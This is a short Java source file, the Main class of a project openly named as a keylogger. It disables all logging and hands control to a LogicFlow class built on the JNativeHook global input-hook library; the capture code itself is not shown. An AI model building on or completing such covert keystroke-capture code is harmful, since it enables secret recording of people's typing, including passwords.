package com.mossad.keylogger;

import com.mossad.keylogger.logic.LogicFlow;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.NativeHookException;

public class Main {

    public static void main(String[] args) throws NativeHookException {
        Logger.getGlobal().setLevel(Level.OFF);
        LogicFlow logicFlow = new LogicFlow();
        logicFlow.execute();
    }

}












